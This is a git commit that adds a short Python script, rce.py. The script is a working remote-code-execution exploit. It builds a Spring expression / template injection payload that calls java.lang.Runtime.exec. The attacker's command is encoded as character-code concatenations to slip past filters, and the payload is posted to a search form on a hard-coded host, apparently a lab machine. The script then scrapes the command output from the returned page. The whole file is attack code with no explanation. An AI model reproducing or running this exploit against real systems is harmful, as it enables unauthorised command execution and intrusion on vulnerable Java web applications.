a4a082bb9bdf165d028e6262fd2d11f3c50074c9
bhavikmalhotra <65305368+bhavikmalhotra@users.noreply.github.com>
2022-08-09 14:15:25 -0700

    Add files via upload

---
+++ rce.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python
+import sys
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://10.10.11.170:8080/search"
+payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)"
+proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+command = sys.argv[1]
+ascii_values = []
+flag = 0
+
+for c in command:
+	ascii_values.append(ord(c))
+
+for value in ascii_values:
+	if flag == 0:
+		payload += f".toString({value})"
+		flag = 1
+	else:
+		payload += f".concat(T(java.lang.Character).toString({value}))"
+
+payload += ").getInputStream())}"
+
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+post_data = {'name':payload}
+post_data = "&".join("%s=%s" % (k,v) for k,v in post_data.items())
+
+r = requests.post(url,proxies=proxy,data=post_data,headers=headers)
+
+soup = BeautifulSoup(r.text, 'html.parser')
+out = soup.body.h2.contents[0]
+out = out.replace('You searched for:','').strip()
+
+print(out)
+
+
